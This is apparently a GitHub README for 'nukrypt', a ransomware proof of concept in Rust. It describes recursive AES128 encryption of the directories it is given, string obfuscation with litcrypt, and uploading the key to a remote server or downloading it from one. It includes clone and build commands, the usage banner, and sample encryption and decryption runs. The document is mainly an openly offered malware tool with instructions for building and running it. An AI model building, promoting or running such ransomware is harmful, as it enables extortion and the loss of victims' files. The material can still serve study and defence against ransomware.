nukrypt
=======
A ransomware PoC written in Rust. `nukrypt` will recursively traverse all directories given to it as CLI arguments and encrypt files using AES128. The 128-bit key is generated at runtime and dropped at the current working directory (if it does not exist). The AES IV is written to the beginning of each encrypted file. Encrypted files are suffixed with `.nukrypt`.


Features
--------
- AES128
- Literal encryption using [litcrypt](https://docs.rs/litcrypt/latest/litcrypt/)
- Download or upload AES key from a remote server.
- Some safeguards to prevent unintended data loss.


Compilation
-----------
- Simply `git clone` the repository and `cargo build` the project:
```
$ git clone https://github.com/hiatus/nukrypt
$ cd nukrypt
$ cargo build --release
```


Usage
-----
- Command line banner:
```
USAGE:
    nukrypt [FLAGS] [OPTIONS] <dir>...

FLAGS:
    -d, --decrypt    Decrypt instead of encrypting
    -h, --help       Prints help information
    -V, --version    Prints version information

OPTIONS:
    -k, --key-file <file|url>    Read/write AES key from/to [file] or download/upload from/to [url]

ARGS:
    <dir>...    Folder(s) to recursively encrypt or decrypt
```

### Encrypt
In encryption mode (not specifying the `-d` option), `nukrypt` will first attempt to read the key either from a remote server or from a local file (depending on what was given as argument to `-k`). If the key cannot be read, it will generate it and either upload it or save it locally (in the URL or path given). After this, all `dir`s will be recursively encrypted.

```
$ nukrypt -k nukrypt.key ./encrypt-me/
[+] Encryption key written to nukrypt.key

[#] Encrypting: ./encrypt-me/notes.txt
[#] Encrypting: ./encrypt-me/project/curriculum.pdf
[#] Encrypting: ./encrypt-me/project/accounting.xlsx

[+] 3 files encrypted in 0.002 seconds
```

### Decrypt
When called with option `-d`, `nukrypt` will attempt to read the key either from a remote server or from a local file and recursively decrypt all `dir`s.
```
$ nukrypt -dk nukrypt.key ./encrypt-me/
[+] AES key read from nukrypt.key

[#] Decrypting: ./encrypt-me/notes.txt.nukrypt
[#] Decrypting: ./encrypt-me/project/curriculum.pdf.nukrypt
[#] Decrypting: ./encrypt-me/project/accounting.xlsx.nukrypt

[+] 3 files decrypted in 0.000 seconds
```
